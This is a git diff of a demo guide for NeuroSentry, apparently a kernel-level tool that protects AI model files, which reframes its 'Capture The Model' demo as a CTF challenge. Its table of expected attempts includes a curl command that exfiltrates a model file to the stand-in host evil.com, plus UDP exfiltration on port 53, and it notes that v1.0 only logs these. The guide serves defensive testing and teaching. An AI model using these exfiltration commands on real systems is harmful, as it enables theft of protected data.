@@ -1,6 +1,6 @@
 # NeuroSentry Demo Guide
 
-This guide covers setting up and running live demonstrations of NeuroSentry, including the interactive "Capture The Model" demo environment.
+This guide covers setting up and running live demonstrations of NeuroSentry, including the interactive "Capture The Model" lab challenge.
 
 ---
 
@@ -43,7 +43,7 @@ cat /sys/kernel/security/lsm
 
 ```bash
 # Clone repository
-git clone https://github.com/neurosentry/neurosentry.git
+git clone https://github.com/tonghuaroot/neurosentry.git
 cd neurosentry
 
 # Build the demo
@@ -56,11 +56,11 @@ docker exec -it attacker sh
 
 ---
 
-## Capture The Model Demo
+## Capture The Model Challenge
 
 ### Overview
 
-The "Capture The Model" demo is an interactive environment that demonstrates NeuroSentry's protection capabilities in real-time. Participants attempt to exfiltrate a protected AI model while NeuroSentry actively blocks their attempts.
+The "Capture The Model" challenge is an interactive CTF that demonstrates NeuroSentry's protection capabilities in real-time. Participants attempt to exfiltrate a protected AI model while NeuroSentry actively blocks their attempts.
 
 ### Setup Instructions
 
@@ -113,14 +113,14 @@ docker run -d --name attacker \
 
 **Forbidden**: DoS on other systems, physical access, attacking other participants
 
-### Achievement Categories
+### Prize Categories
 
-| Achievement | Criteria |
-|-------------|----------|
-| Attacker | Successfully exfiltrate the model |
-| Explorer | 10+ creative attempts documented |
-| Researcher | Find a novel bypass technique |
-| Auditor | Find a critical security bug (CVE candidate) |
+| Hat | Criteria | Prize |
+|-----|----------|-------|
+| 🎩 Black Hat | Successfully exfiltrate the model | Unlimited availability |
+| ⚪ White Hat | 10+ creative attempts documented | Participation trophy |
+| ⚫ Grey Hat | Find a novel bypass technique | Consulting job offer |
+| 🔴 Red Hat | Find a real security bug in NeuroSentry | Credit in `SECURITY.md` + thanks |
 
 ### Scoring System
 
@@ -146,14 +146,14 @@ curl http://localhost:8080/leaderboard
 
 ### Expected Participant Attempts
 
-| Attempt | Expected Result | Why It Fails |
-|---------|-----------------|--------------|
-| `cp /target/model.safetensors /tmp/` | EPERM | LSM file_open hook |
-| `cat /target/model.safetensors > /tmp/` | EPERM | LSM file_permission hook |
-| `dd if=/target/...` | EPERM | LSM read hook |
+| Attempt | Expected Result | Why |
+|---------|-----------------|-----|
+| `cp /target/model.safetensors /tmp/` | EPERM | LSM `file_open` returns `-EPERM` |
+| `cat /target/model.safetensors > /tmp/` | EPERM | Same — `cat` calls `open(2)` first |
+| `dd if=/target/...` | EPERM | Same — `dd` calls `open(2)` first |
 | `kill -9 $(pidof neurosentry)` | Auto-restart | Container restart policy |
-| `curl --data-binary @/target/... evil.com` | Blocked | XDP network filter |
-| UDP exfil on port 53 | Blocked | XDP only allows DNS queries |
+| `curl --data-binary @/target/... evil.com` | Logged, **not** blocked | TC/XDP are monitor-only in v1.0 — see Grafana flows panel for the captured event |
+| UDP exfil on port 53 | Logged, **not** blocked | Same — no XDP_DROP in shipped programs |
 
 ### Organizer Notes
 
@@ -388,12 +388,13 @@ dd if=/dev/urandom of=/tmp/model.safetensors bs=1M count=1024  # 1GB
 
 - [Architecture Documentation](architecture.md)
 - [User Guide](user-guide.md)
-- [Demo Environment README](../demos/capture-the-model/README.md)
-
+- [CTF Challenge README](../demos/capture-the-model/README.md)
+- [Demo Video](../demos/video/neurosentry-demo.mp4)
 
 ---
 
 ## Contact
 
 For questions about the demo or to report issues:
-- **GitHub**: https://github.com/tonghuaroot/neurosentry/issues
+- **GitHub Issues**: https://github.com/tonghuaroot/neurosentry/issues
+- **Security reports**: see [SECURITY.md](../SECURITY.md)
